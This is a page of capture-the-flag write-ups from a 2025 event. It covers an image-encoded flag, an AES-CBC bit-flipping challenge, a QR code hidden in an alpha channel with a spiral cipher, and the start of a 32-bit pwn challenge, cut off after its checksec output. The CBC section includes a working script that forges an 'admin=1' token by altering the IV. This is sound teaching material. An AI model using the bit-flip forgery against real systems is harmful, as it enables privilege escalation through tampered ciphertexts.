</pre></table></code></div></div><p>Each row gives <strong>16 bits</strong> (2 ASCII characters of 8 bits each).<br /> After converting the binary values to text, the decoded message appears as:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{7H3_H1DD3N_L4Y3R}
</pre></table></code></div></div><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{7H3_H1DD3N_L4Y3R}
</pre></table></code></div></div><h2 id="lessons-learned"><span class="mr-2">Lessons Learned</span><a href="#lessons-learned" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Binary-encoded patterns in images can directly store ASCII text.<li>Always check for pixel-level hints in Forensics challenges.<li>Knowing how to manipulate images programmatically is very useful in CTFs.</ul><h2 id="resources"><span class="mr-2">Resources</span><a href="#resources" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><a href="https://www.rapidtables.com/convert/number/binary-to-ascii.html">Binary to ASCII Conversion Reference</a></ul><h2> Flag</h2><code> CYS{7H3_H1DD3N_L4Y3R} </code><hr><h1 id="do-you-know-xor-well-enough"> Do you know XOR well enough? <a href="/writeups/FinalTrace_2025/03-do-you-know-xor-well-enough.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="do-you-know-xor-well-enough">Do you know XOR well enough?</h1><ul><li>Category: Cryptography<li>Author: P C Guhan</ul><h2 id="description"><span class="mr-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote><p>Random numbers, AES encryption, SHA 256, HMAC, constant-time hash checking… what more do you want? All are imported functions, hence highly secure Or is it??</p></blockquote><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img src="image.png" alt="AES CBC Encryption" /> <img src="image-1.png" alt="AES CBC Decryption" /></p><p>This method uses the previous block to encrypt the next block. The same follows for decryption also. Hence, a bit flip will alter the plaintext.</p><p>Each hex requires two characters. The length of “admin=0” is 7. The hex output consists of the 16 bit IV and the 16 bit padded ciphertext. The IV is XOred with the decrypted ciphertext.</p><p>To get admin=1, we XOR the 6th character block with 1. i.e. IV[6] ^ decrypted(message[6]) ^ 1 = 0 ^ 1 since 0 ^ 1 = 1,</p><p>IV[6] ^ decrypted(message[6]) ^ 1 = 1 giving us admin=1</p><p>A corresponding hash can be generated as the hashing algorithm is open source.</p><p>To mitigate this vulnerability while still using AES CBC mode, AEAD (Authenticated Encryption and Additional Data) must be used i.e. hashing with a secret key.</p><h2 id="script"><span class="mr-2">Script</span><a href="#script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="n">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">unpad</span>
<span class="kn">from</span> <span class="n">Crypto.Random</span> <span class="kn">import</span> <span class="n">get_random_bytes</span>
<span class="kn">import</span> <span class="n">hashlib</span>
<span class="kn">import</span> <span class="n">hmac</span>
<span class="kn">import</span> <span class="n">random</span>

<span class="c1"># --- setup (same as challenge) ---
</span><span class="n">key</span> <span class="o">=</span> <span class="nf">get_random_bytes</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
<span class="n">iv</span> <span class="o">=</span> <span class="nf">get_random_bytes</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>

<span class="n">part1</span> <span class="o">=</span> <span class="sh">"</span><span class="s">AES</span><span class="sh">"</span>
<span class="n">part2</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">5</span><span class="p">))</span>
<span class="n">part3</span> <span class="o">=</span> <span class="sh">"</span><span class="s">AEAD</span><span class="sh">"</span>
<span class="n">part4</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">999999</span><span class="p">)</span><span class="si">:</span><span class="mi">06</span><span class="n">d</span><span class="si">}</span><span class="sh">"</span>
<span class="n">part5</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">3</span><span class="p">))</span>
<span class="n">flag</span> <span class="o">=</span> <span class="sh">"</span><span class="s">CYS{</span><span class="sh">"</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">part1</span><span class="si">}</span><span class="s">_</span><span class="si">{</span><span class="n">part2</span><span class="si">}</span><span class="s">_</span><span class="si">{</span><span class="n">part3</span><span class="si">}</span><span class="s">_</span><span class="si">{</span><span class="n">part4</span><span class="si">}</span><span class="s">_</span><span class="si">{</span><span class="n">part5</span><span class="si">}</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">}</span><span class="sh">"</span>

<span class="k">def</span> <span class="nf">encrypt_data</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
    <span class="n">enc</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="nf">encrypt</span><span class="p">(</span><span class="nf">pad</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">encode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">,</span> <span class="n">style</span><span class="o">=</span><span class="sh">'</span><span class="s">pkcs7</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">enc</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">decrypt_data</span><span class="p">(</span><span class="n">encryptedParams</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">encryptedParams</span><span class="p">)</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">Ciphertext too short</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">iv_in</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv_in</span><span class="p">)</span>
    <span class="n">paddedParams</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
    <span class="n">plaintext</span> <span class="o">=</span> <span class="nf">unpad</span><span class="p">(</span><span class="n">paddedParams</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">style</span><span class="o">=</span><span class="sh">'</span><span class="s">pkcs7</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">plaintext</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="sh">'</span><span class="s">ignore</span><span class="sh">'</span><span class="p">)</span>


<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Just copy and paste? Hash is also given...</span><span class="sh">"</span><span class="p">)</span>
<span class="n">msg</span> <span class="o">=</span> <span class="sh">"</span><span class="s">admin=0</span><span class="sh">"</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">Current authentication message is : </span><span class="sh">"</span> <span class="o">+</span> <span class="n">msg</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Turn it to admin=1</span><span class="sh">"</span><span class="p">)</span>

<span class="n">cipher_hex</span> <span class="o">=</span> <span class="nf">encrypt_data</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
<span class="n">iv_cipher</span> <span class="o">=</span> <span class="n">iv</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span> <span class="o">+</span> <span class="n">cipher_hex</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">Encryption of authentication message in hex : </span><span class="sh">"</span> <span class="o">+</span> <span class="n">iv_cipher</span><span class="p">)</span>


<span class="n">hashed_value</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">iv_cipher</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)).</span><span class="nf">hexdigest</span><span class="p">()</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">SHA-256: </span><span class="sh">"</span><span class="p">,</span> <span class="n">hashed_value</span><span class="p">)</span>

<span class="c1"># -----------------------------
# Solution
# Reliable CBC bit-flip to change admin=0 -&gt; admin=1
# -----------------------------
</span><span class="n">orig_msg</span> <span class="o">=</span> <span class="sh">"</span><span class="s">admin=0</span><span class="sh">"</span>
<span class="n">target_msg</span> <span class="o">=</span> <span class="sh">"</span><span class="s">admin=1</span><span class="sh">"</span>

<span class="n">p0</span> <span class="o">=</span> <span class="nf">pad</span><span class="p">(</span><span class="n">orig_msg</span><span class="p">.</span><span class="nf">encode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">,</span> <span class="n">style</span><span class="o">=</span><span class="sh">'</span><span class="s">pkcs7</span><span class="sh">'</span><span class="p">)[:</span><span class="mi">16</span><span class="p">]</span>
<span class="n">p1</span> <span class="o">=</span> <span class="nf">pad</span><span class="p">(</span><span class="n">target_msg</span><span class="p">.</span><span class="nf">encode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">,</span> <span class="n">style</span><span class="o">=</span><span class="sh">'</span><span class="s">pkcs7</span><span class="sh">'</span><span class="p">)[:</span><span class="mi">16</span><span class="p">]</span>

<span class="n">delta</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">a</span> <span class="o">^</span> <span class="n">b</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">p0</span><span class="p">,</span> <span class="n">p1</span><span class="p">))</span>

<span class="n">iv_prime</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">a</span> <span class="o">^</span> <span class="n">b</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">iv</span><span class="p">,</span> <span class="n">delta</span><span class="p">))</span>

<span class="n">enc_msg</span> <span class="o">=</span> <span class="n">iv_prime</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span> <span class="o">+</span> <span class="n">cipher_hex</span>
<span class="n">enc_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">enc_msg</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)).</span><span class="nf">hexdigest</span><span class="p">()</span>


<span class="c1"># --- setup (same as challenge) ---
</span><span class="k">try</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">hmac</span><span class="p">.</span><span class="nf">compare_digest</span><span class="p">(</span><span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">enc_msg</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)).</span><span class="nf">hexdigest</span><span class="p">(),</span> <span class="n">enc_hash</span><span class="p">):</span>
        <span class="n">final_dec_msg</span> <span class="o">=</span> <span class="nf">decrypt_data</span><span class="p">(</span><span class="n">enc_msg</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">final_dec_msg</span><span class="p">)</span>

        <span class="k">if</span> <span class="sh">"</span><span class="s">admin=1</span><span class="sh">"</span> <span class="o">==</span> <span class="n">final_dec_msg</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">Try again you can do it!!</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">Hashing failed</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">enc_msg</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)).</span><span class="nf">hexdigest</span><span class="p">()</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\n\n</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">enc_hash</span><span class="p">)</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">bye bye!!</span><span class="sh">'</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>

</pre></table></code></div></div><h2> Flag</h2><code> Dynamic Flag </code><hr><h1 id="alpha-parallel"> Alpha Parallel <a href="/writeups/FinalTrace_2025/04-alpha-parallel.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="alpha-parallel">Alpha Parallel</h1><h2 id="challenge-information"><span class="mr-2">Challenge Information</span><a href="#challenge-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="table-wrapper"><table><thead><tr><th>Field<th>Details<tbody><tr><td><strong>Title</strong><td>Alpha Parallel<tr><td><strong>Category</strong><td>Forensics / Cryptography<tr><td><strong>Difficulty</strong><td>Easy<tr><td><strong>Points</strong><td>150</table></div><hr /><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The provided PNG image contained <strong>two QR codes</strong> — one clearly visible, and another <strong>hidden within the alpha channel</strong> (transparency layer).</p><p>When extracted, the <strong>visible QR</strong> directed players to a YouTube video, while the <strong>hidden QR</strong> led to a Pastebin URL containing a <strong>Spiral Cipher</strong> challenge.</p><p>The player’s goal was to uncover the hidden data layer, decode the spiral cipher, and retrieve the final flag.</p><hr /><h2 id="step-1-inspecting-the-png-layers"><span class="mr-2">Step 1: Inspecting the PNG Layers</span><a href="#step-1-inspecting-the-png-layers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Opening the image in a standard viewer only showed one QR code.<br /> However, using a forensic image inspection tool like <strong>GIMP</strong>, <strong>StegSolve</strong>, or <strong>Python (Pillow)</strong> revealed that the <strong>alpha channel</strong> contained distinct pixel patterns — forming a second QR code.</p><h3 id="extract-alpha-channel-using-python"><span class="mr-2">Extract Alpha Channel Using Python</span><a href="#extract-alpha-channel-using-python" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">PIL</span> <span class="kn">import</span> <span class="n">Image</span>

<span class="c1"># Load image
</span><span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">dual_qr.png</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># Split image into channels (RGBA)
</span><span class="n">r</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">a</span> <span class="o">=</span> <span class="n">img</span><span class="p">.</span><span class="nf">split</span><span class="p">()</span>

<span class="c1"># Save the alpha channel separately
</span><span class="n">a</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="sh">"</span><span class="s">hidden_qr.png</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Hidden QR extracted as hidden_qr.png</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p>This script isolates the transparency layer (<code class="language-plaintext highlighter-rouge">alpha</code>) and saves it as a new image — <strong>hidden_qr.png</strong> — which can then be scanned.</p><hr /><h2 id="step-2-scanning-both-qr-codes"><span class="mr-2">Step 2: Scanning Both QR Codes</span><a href="#step-2-scanning-both-qr-codes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After extraction:</p><ul><li><strong>Visible QR:</strong> Scanned to <code class="language-plaintext highlighter-rouge">https://www.youtube.com/watch?v=dQw4w9WgXcQ</code><li><strong>Hidden QR:</strong> Scanned to a <strong>Pastebin URL</strong><br /> <code class="language-plaintext highlighter-rouge">https://pastebin.com/ZmkMxUdY</code></ul><p>The Pastebin text displayed a <strong>5×5 grid</strong>, which was actually a <strong>Spiral Cipher</strong>.</p><hr /><h2 id="step-3-understanding-the-spiral-cipher"><span class="mr-2">Step 3: Understanding the Spiral Cipher</span><a href="#step-3-understanding-the-spiral-cipher" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Pastebin content:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>X P H A _
2 L H A Q
4 A S D R
_ _ W O _
R E Y A L
</pre></table></code></div></div><p>The challenge description hinted:</p><blockquote><p>“Outward, start by up, clockwise.”</p></blockquote><p>This means we must read the characters <strong>from the center outward</strong>, following a <strong>clockwise spiral</strong> starting <strong>upward</strong>.</p><hr /><h2 id="step-4-solving-the-spiral-cipher-in-python"><span class="mr-2">Step 4: Solving the Spiral Cipher in Python</span><a href="#step-4-solving-the-spiral-cipher-in-python" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To automate decoding, we can write a small script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">spiral_read</span><span class="p">(</span><span class="n">matrix</span><span class="p">):</span>
    <span class="n">n</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">matrix</span><span class="p">)</span>
    <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="n">n</span> <span class="o">//</span> <span class="mi">2</span>  <span class="c1"># start from center
</span>    <span class="n">dx</span><span class="p">,</span> <span class="n">dy</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span>  <span class="c1"># start moving up
</span>    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="n">steps</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">while</span> <span class="nf">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="o">*</span> <span class="n">n</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>  <span class="c1"># two directions before increasing step size
</span>            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">steps</span><span class="p">):</span>
                <span class="k">if</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="ow">and</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">y</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="ow">and</span> <span class="n">matrix</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">_</span><span class="sh">'</span><span class="p">:</span>
                    <span class="n">result</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">matrix</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">])</span>
                <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">dx</span><span class="p">,</span> <span class="n">y</span> <span class="o">+</span> <span class="n">dy</span>
            <span class="n">dx</span><span class="p">,</span> <span class="n">dy</span> <span class="o">=</span> <span class="n">dy</span><span class="p">,</span> <span class="o">-</span><span class="n">dx</span>  <span class="c1"># rotate 90° clockwise
</span>        <span class="n">steps</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="n">grid</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">[</span><span class="sh">'</span><span class="s">X</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">P</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">H</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">_</span><span class="sh">'</span><span class="p">],</span>
    <span class="p">[</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">L</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">H</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">Q</span><span class="sh">'</span><span class="p">],</span>
    <span class="p">[</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">S</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">D</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">R</span><span class="sh">'</span><span class="p">],</span>
    <span class="p">[</span><span class="sh">'</span><span class="s">_</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">_</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">W</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">O</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">_</span><span class="sh">'</span><span class="p">],</span>
    <span class="p">[</span><span class="sh">'</span><span class="s">R</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">E</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">Y</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">L</span><span class="sh">'</span><span class="p">]</span>
<span class="p">]</span>

<span class="n">flag</span> <span class="o">=</span> <span class="nf">spiral_read</span><span class="p">(</span><span class="n">grid</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Decoded Spiral:</span><span class="sh">"</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
</pre></table></code></div></div><p><strong>Output:</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Decoded Spiral: CYS{SHADOW_ALPHA_QR_LAYER_42X}
</pre></table></code></div></div><hr /><h2 id="final-flag"><span class="mr-2">Final Flag</span><a href="#final-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{SHADOW_ALPHA_QR_LAYER_42X}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{SHADOW_ALPHA_QR_LAYER_42X} </code><hr><h1 id="the-door-s-mechanism"> The Door's Mechanism <a href="/writeups/FinalTrace_2025/05-the-doors-mechanism.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="the-doors-mechanism">The Door’s Mechanism</h1><h2 id="challenge-information"><span class="mr-2">Challenge Information</span><a href="#challenge-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Title</strong>: The Door’s Mechanism<li><strong>Category</strong>: pwn<li><strong>Difficulty</strong>: Easy<li><strong>Points</strong>: [Point Value]</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We are given a 32-bit ELF binary named <code class="language-plaintext highlighter-rouge">vuln</code>. The goal is to provide the correct input to get the flag.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First run <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">checksec</code> on the binary to see what we are dealing with.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, ... not stripped

<span class="nv">$ </span>checksec vuln
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'vuln'</span>
    Arch:     i386-32-bit-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
